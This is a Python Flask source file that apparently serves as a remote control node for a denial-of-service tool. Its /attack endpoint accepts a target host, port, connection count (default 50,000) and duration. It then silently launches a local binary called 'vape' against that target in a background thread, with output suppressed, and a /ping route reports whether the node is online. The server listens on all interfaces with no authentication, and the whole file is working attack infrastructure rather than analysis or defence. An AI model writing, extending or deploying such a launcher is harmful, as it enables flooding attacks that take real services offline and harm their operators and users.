import os
import subprocess
import threading
from flask import Flask, request, jsonify

VAPE_BIN = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vape")
PORT     = int(os.environ.get("VAPE_API_PORT", 8080))

app = Flask(__name__)


@app.route("/ping", methods=["GET"])
def ping():
    return jsonify({"status": "online"}), 200


@app.route("/attack", methods=["POST"])
def attack():
    data        = request.get_json(silent=True) or {}
    host        = str(data.get("host", ""))
    port        = int(data.get("port", 80))
    connections = int(data.get("connections", 50000))
    duration    = int(data.get("duration", 60))
    lownet      = bool(data.get("lownet", False))

    if not host or port < 1 or port > 65535:
        return jsonify({"error": "invalid params"}), 400

    cmd = [VAPE_BIN, host, str(port), str(connections), "0", str(duration)]
    if lownet:
        cmd.append("lownet")

    def run():
        try:
            subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                close_fds=True
            )
        except Exception:
            pass

    threading.Thread(target=run, daemon=True).start()
    return jsonify({"status": "launched"}), 200


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=PORT)
